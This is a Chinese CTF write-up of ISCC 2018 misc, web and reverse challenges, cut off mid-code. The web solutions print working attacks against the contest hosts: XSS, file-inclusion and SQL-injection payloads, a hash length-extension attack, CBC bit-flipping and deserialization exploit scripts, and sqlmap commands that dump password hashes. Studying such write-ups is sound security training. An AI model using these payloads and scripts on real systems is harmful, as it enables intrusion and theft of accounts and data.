cE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA== 一直base64解码，得到 1U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= 以U2FsdGVkX1开头的密文是AES加密，，然后使用openssl进行解密，顺带猜密码，最后在encrypt解密得到 1缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 到与佛论禅进行解密得出flag为：把我复制走 凯撒十三世题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。 这个比较明显，就是取凯撒的13行，也就是rot13，结果是roqtp697t95j3，再进行键盘密码解密，得到flag为：yougotme，唯一的小坑就是对这个键盘密码的时候。 有趣的ISCC附件地址有趣的ISCC 题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？ 查看图片信息，最末尾发现了 1&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.9.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.4.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.5.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.9.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.3.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.1.0.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.1.0.0.; 处理还原，得出 1\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d 再还原就成了flag{iscc is fun} 数字密文题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921 16进制转个文本就行。 挖宝计划题目附件：挖宝计划 题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？ 去年没解出来的数据分析题目。 查看zip的内容，发现是有解压密码的，但是不知道是什么，发现zip内也有一个getFlag.py，大小及CRC值一致，所以推断是存在明文攻击的解压漏洞。 但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的 1&quot;以文找文&quot;（寻&quot;文&quot;启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题 降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。 嵌套ZIPs题目附件：嵌套ZIPs 题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？ 看到ZIPs感觉就是一直要爆破的节奏。没什么思路那就爆破了。 解出来，又是明文攻击 ISCC_!S_my_favor1te_CTF 0x02 Web比较数字大小 限制了长度为3，将maxlength修改为大于3的值再输入超过3位数的数字即可，比如maxlength=33，输入值为12345 或者直接抓包改值。 flag为：768HKyu678567&amp;*&amp;K 你能跨过去吗？页面显示 12345Key Words:XSS如果你对xss了解的话,那你一定知道key是什么了，加油！http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413 对其中的base64编码进行解码，得出&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script，提交/%nsfocusXSStest%/即可得出flag 一切都是套路hit:好像有个文件忘记删了 打开index.php.txt 发现 1234567891011121314151617&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $k =&gt; $v)&#123; $$k = $$v;&#125;foreach ($_POST as $k =&gt; $v)&#123; $$k = $v;&#125;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt; 需要满足3个if才能得到flag，这是个$$导致的变量覆盖问题。题目中使用了两个foreach并且也使用了$$，两个foreach中对$$k的处理是不一样的，满足条件后会将$flag里面的值打印出来。 但由于第5与第13-14行的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403，然后利用die($_200)或 die($_403)将flag打印出来。 你能绕过吗?hit:没过滤好啊 这个题目，最开始以为是注入题，毕竟这个题目这个显示。 尝试了id的注入点，最后在尝试修改f参数为index.php，发现带有php参数的显示了 error...，最后的尝试 index.php的源码为 123456789101112&lt;?php #ISCC&#123;LFIOOOOOOOOOOOOOO&#125; if(isset($_GET[&apos;f&apos;]))&#123; if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123; die(&quot;error...&quot;); &#125; else&#123; include($_GET[&apos;f&apos;] . &apos;.php&apos;); &#125; &#125; ?&gt; 原来如此，怪不得带有php的都报错了。 web02打开链接显示 1错误！你的IP不是本机ip！ 应该就是伪造IP了。尝试各种伪造IP的http头 12345X-Forwarded-ForClient-IPx-remote-IPx-originating-IPx-remote-addr 本地的诱惑题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题） 右键源码： 12345678910111213&lt;?php //print_r($_SERVER);$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);if($arr[0]==&apos;127.0.0.1&apos;)&#123; //key echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;&#125;else&#123; echo &quot;必须从本地访问！&quot;;&#125;?&gt;&lt;?php//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.echo file_get_contents(__FILE__); Please give me username and password!访问index.php.txt。 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$flag = &quot;***********&quot;; if(isset($_GET[&apos;username&apos;]))&#123; if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123; $a = fla; echo &quot;very good!Username is right&quot;; &#125; else&#123; print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;&#125;elseprint &apos;Please give me username or password!&apos;;if (isset($_GET[&apos;password&apos;]))&#123; if (is_numeric($_GET[&apos;password&apos;]))&#123; if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123; if ($_GET[&apos;password&apos;] &gt; 999)&#123; $b = g; print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;&#125;if ($a.$b == &quot;flag&quot;) print $flag;?&gt; 绕过即可username[]=&amp;password=9e9 试试看题目：随意开火 查看图片，观察URL为/show.php?img=1.jpg。已经没有别的页面了，估计就是文件读取 12345?img=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=show.php # File not found.不正常。。。。?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=show.php # 正常访问 有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在../flag.php找到flag 请ping我的ip 看你能Ping通吗？题目：我都过滤了，看你怎么绕。 题目地址：http://118.190.152.202:8018 直接访问http://118.190.152.202:8018/flag.txt 就出现flag了。 正确解法是 SQL注入的艺术扫描扫到/admins，访问直接下载，打开发现是数据库链接信息，内部含有flag。 正确解法：宽字节注入 12http://118.190.152.202:8015/index.php?id=1%df%27http://118.190.152.202:8015/index.php?id=1%df%27%20and%201=1%20--+ web0112345678910&lt;?php highlight_file(&apos;2.php&apos;); $flag=&apos;&#123;***************&#125;&apos;; if (isset($_GET[&apos;password&apos;])) &#123; if (strcmp($_GET[&apos;password&apos;], $flag) == 0) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; &#125; ?&gt; 想都不想，直接/password[]=flag Collide题目：那么长的秘钥，要爆破到什么时候啊 1234567891011121314151617181920&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&apos;username&apos;];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123; if(is_numeric(strpos($username, &quot;admin&quot;)))&#123; die($flag); &#125; else&#123; die(&quot;you are not admin&quot;); &#125;&#125;else&#123; setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7); setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); hash长度扩展攻击 $key变量我们是不知道的，但是从len值中能获取到长度为46 从verify中得到md5($key.guest)的值为：78cfc57d983b4a17e55828c001a3e781 成功登陆条件：username=guestxxxxxxxxadmin，并且verify要等于md5($key.uaername) 123456hashpump -s 78cfc57d983b4a17e55828c001a3e781 -d guest -k 46 -a admin得出5f585093a7fe86971766c3d25c43d0ebguets\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin处理guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin 这个提交得看脸。 ISCC{MD5_1s_n0t_5afe} Only admin can see flag查看源码发现提示index.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude &apos;sqlwaf.php&apos;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123; $iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $iv.=chr(rand(1,255)); &#125; return $iv;&#125;function login($info)&#123; $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;; die();&#125;function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123; $username=waf((string)$_POST[&apos;username&apos;]); $password=waf((string)$_POST[&apos;password&apos;]); if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;&#125;?&gt; CBC字节反转攻击攻击题目，先将输入的账号密码序列化，也就是获取$plain。 123456789&lt;?php$username = &apos;Admin&apos;;$password = &apos;RcoIl&apos;;$info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);$plain = serialize($info);echo $plain;?&gt;运算结果：a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125; 我们的目的就是将Admin中的A转换成a，接下来就是把明文分成16个字节的块（因为AES-128以128位为一块,正好16字节） 1234a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125; 我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__=&apos;RcoIl&apos;import base64 import requestsimport urllibfrom urllib import unquoteurl = &apos;http://118.190.152.202:8001/&apos;data = &#123; &apos;username&apos;: &apos;Admin&apos;, &apos;password&apos;: &apos;12345&apos;,&#125;def Cookie(): s = requests.Session() cookies = s.post(url,data=data).cookies cipher = base64.b64decode(unquote(cookies[&apos;cipher&apos;])) cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(&apos;A&apos;) ^ ord(&apos;a&apos;)) + cipher[10:] Cookie = &quot;PHPSESSID=&quot;+urllib.unquote(cookies[&apos;PHPSESSID&apos;])+&apos;; &apos;+&quot;iv=&quot; + urllib.unquote(cookies[&apos;iv&apos;])+&apos;; &apos;+&quot;cipher=&quot; + urllib.quote(base64.b64encode(cipher)) header = &#123; &quot;Cookie&quot;: Cookie &#125; try: request = requests.post(url , headers = header) except Exception as e: print e else: print request.text[18:][:-24] print Cookie Cookie() 运行结果：C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D查看unserialize的内容 þ¨²¦ãÙ9æpÒÄ¼Ume&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;;&#125;,已成功改成admin 但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。 12345678910111213141516171819202122232425#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__=&apos;RcoIl&apos;import base64import urllibimport requestsurl = &apos;http://118.190.152.202:8001/&apos;iv = base64.b64decode(&quot;w8wkcnN//ERbrLkywW37hA==&quot;)plain = base64.b64decode(&quot;C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&quot;)want = &apos;a:2:&#123;s:8:&quot;userna&apos;newiv = &apos;&apos;for i in range(16): newiv += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))iv = urllib.quote(base64.b64encode(newiv)) # qQi%2BwLqqJaVYDSoxdtspsA%3D%3Dcookie = &quot;PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=&quot;+ iv +&quot;; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D&quot;header = &#123; &quot;Cookie&quot;: cookie &#125;try: request = requests.post(url , headers = header) except Exception as e: print eelse: print request.text 替换提交即可登陆真正的admin用户。 1&lt;p&gt;Hello admin&lt;/p&gt;&lt;p&gt;Flag is ISCC&#123;123dasd89as10aas&#125;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt; php是世界上最好的语言12345678910111213141516171819202122232425&lt;html&gt; &lt;body&gt; &lt;form action=&quot;md5.php&quot; method=&quot;post&quot; &gt; 用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt; 密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt; &lt;input type=&quot;submit&quot; &gt; &lt;/body&gt; &lt;/html&gt; &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; &#125; else&#123; $username=&quot;hello&quot;; $password=&quot;hello&quot;; &#125; if(md5($password) == 0)&#123; echo &quot;xxxxx&quot;; &#125; show_source(__FILE__); ?&gt; 看到第19行，明显的弱类型绕过。密码填写240610708 123456&lt;?php include &apos;flag.php&apos;; $a = @$_REQUEST[&apos;a&apos;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt; 绕过即可 12no_md5.php?a=flagISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125; Only Admin题目：听说只有admin可以看到flag？ 最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。 扫描目录，发现有一个web.zip文件。 1234567891011web├─ .vscode│ └─ launch.json├─ MessageController.class.php├─ UserController.class.php├─ config.php # 配置文件├─ index.php # 登陆后主页├─ login.php # 登陆页面├─ reg.php # 注册页面├─ send.php└─ show.php 审计，难受。 其实也就是带cookie访问的问题。 exp 123456789101112131415161718192021#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport base64url=&quot;http://118.190.152.202:8020/&quot;def attack(url, payload): s=requests.session() u1 = url + &quot;send.php&quot; plen = len(payload) payload = &apos;a:2:&#123;s:5:&quot;email&quot;;O:7:&quot;Message&quot;:4:&#123;s:3:&quot;msg&quot;;s:&apos;+str(plen)+&apos;:&quot;&apos;+payload+&apos;&quot;;s:4:&quot;from&quot;;N;s:2:&quot;to&quot;;N;s:2:&quot;id&quot;;i:-1;&#125;s:8:&quot;password&quot;;s:5:&quot;23333&quot;;&#125;&apos; cookies = &#123;&apos;ckSavePass&apos;: base64.b64encode(payload)&#125; r = s.get(u1, cookies=cookies) u2=&quot;http://118.190.152.202:8020/&quot; +&apos;config.php&apos; r2=s.get(u2) print r2.headers[&apos;Set-Cookie&apos;] return Falsepayload=&quot;111&apos; || 1=1 -- 111&quot;attack(url,payload)运行结果：csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly 为什么这么简单啊进入， 123第一关第二关需要从 http://edu.xss.tv 进入，并且只有我公司的IP地址才可以进入第二关，公司IP为：110.110.110.110 伪造IP 12345678910111213GET / HTTP/1.1Host: 118.190.152.202:8016Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=b604vp88ds9coh4352d3dncih2X-Forwarded-For: 110.110.110.110Referer: http://edu.xss.tvConnection: close 进入到第二关，寻找密码。右键源码看到password.js，解密其中的base64，得到密码xinyiji.com flag：B1H3n5u0xI2n9JIscc Sqli在username存在延迟注入。 1234567891011121314151617181920212223python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;user&quot; -C &quot;username,pass&quot; --dump sqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=%E2%80%98&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))fbFG) AND &apos;xEit&apos;=&apos;xEit&amp;password=&apos;---[15:04:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:04:25] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12运行结果：Database: sqli_databaseTable: user[2 entries]+----------+----------------------------------+| username | pass |+----------+----------------------------------+| test | 098f6bcd4621d373cade4e832627b4f6 |（test）| admin | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）+----------+----------------------------------+ 登陆发现提示flag在另一个字段 12345678910python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;news&quot; -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; --dump运行结果：Database: sqli_databaseTable: news[1 entry]+--------------------------------+| kjafuibafuohnuvwnruniguankacbh |+--------------------------------+| flag&#123;hahaha999999999&#125; |+--------------------------------+ 有种你来绕题目：我都过滤了，看你怎么绕。记住是mysql 只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin 注入，过滤了空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d等，需要想办法用其他操作符连接注入语句和闭合’。 原文操作：https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/ 得出密码为0416af0a8accf2be556a8e131438b814(nishishabi1438) 登陆之后和原题不一样了，直接填写flag就出现了flag值。 flag{sql_iNjEct_Is_Easy} 0x03 ReverseRSA256三个加密文件一个公钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import gmpy2def ModExp(n, k, m): a = list(bin(k))[2:] a.reverse() s = 1 for i in a: if i == &apos;1&apos;: s = (s * n) % m n = (n * n) % m return sn = int(&apos;D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB&apos;, 16)print(&apos;n is&apos;)print(n)p = gmpy2.mpz(302825536744096741518546212761194311477)q = gmpy2.mpz(325045504186436346209877301320131277983)e = gmpy2.mpz(65537)phi_n = (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print(&quot;d is:&quot;)print(d)p = 302825536744096741518546212761194311477q = 325045504186436346209877301320131277983def ByteToHex( bins ): return &apos;&apos;.join( [ &quot;%02X&quot; % x for x in bins ] ).strip()file1 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1&quot;, &apos;rb&apos;).read()c1 = int(ByteToHex(file1), 16)print(&quot;c1&quot;, c1)file2 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2&quot;, &apos;rb&apos;).read()c2 = int(ByteToHex(file2), 16)file3 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3&quot;, &apos;rb&apos;).read()c3 = int(ByteToHex(file3), 16)m = p * qflag1 = ModExp(c1, d, m)flag2 = ModExp(c2, d, m)flag3 = ModExp(c3, d, m)flag = &apos;0&apos; + hex(flag1)[2:] + &apos;0&apos; + hex(flag2)[2:] + &apos;0&apos; + hex(flag3)[2:]print(flag)i = 0result = &apos;&apos;for i in range(0, len(flag), 2): result += chr((int(flag[i:i+2], 16)))print(result) My math is bad程序地址：My math is bad 题目：I think the math problem is too difficult for me. 12# file ReverseReverse: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped IDA又是不显示main函数 满足sub_400766()就输出sub_400B16()，那就，直接看sub_400B16() ？看了看，不行哦，捷径走不了，那就看sub_400766()里的东西。 12345678910111213141516171819202122232425262728if ( strlen(s) == 32 )&#123; v3 = unk_6020B0; v4 = unk_6020B4; v5 = unk_6020B8; v6 = unk_6020BC; result = 0; if ( dword_6020A4 * (signed __int64)*(signed int *)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed int *)s == 397958918 &amp;&amp; 3 * *(signed int *)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL &amp;&amp; 27LL * dword_6020A4 + *(signed int *)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL ) &#123; srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL ) result = 1; &#125;&#125; 结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成 12s、dword_6020A4、dword_6020A8、dword_6020AC、unk_6020B0(v3)、unk_6020B4(v4)、unk_6020B8(v5)、unk_6020BC(v6) 依次验证，满足条件即返回1，则通过校验。 详细看看第8-13行，4个未知数和四个方程，emmm。 1234dword_6020A4 *s - dword_6020AC * dword_6020A8 == 26520428329201731423 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 3979589183 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 334569238037671507027 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 利用python的z3库 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *dword_6020A4 = Int(&apos;dword_6020A4&apos;)dword_6020AC = Int(&apos;dword_6020AC&apos;)dword_6020A8 = Int(&apos;dword_6020A8&apos;)s = Int(&apos;s&apos;)solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 , 3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 , 3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 , 27 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )运算结果：s = 1869639009dword_6020A4 = 1801073242dword_6020A8 = 829124174dword_6020AC = 862734414 接下来到异或运算，直接用C语言吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;int v1,v2,v7,v8,v9,v10,v11,v12;int main(void) &#123; srand(829124174 ^ 1801073242 ^ 1869639009 ^ 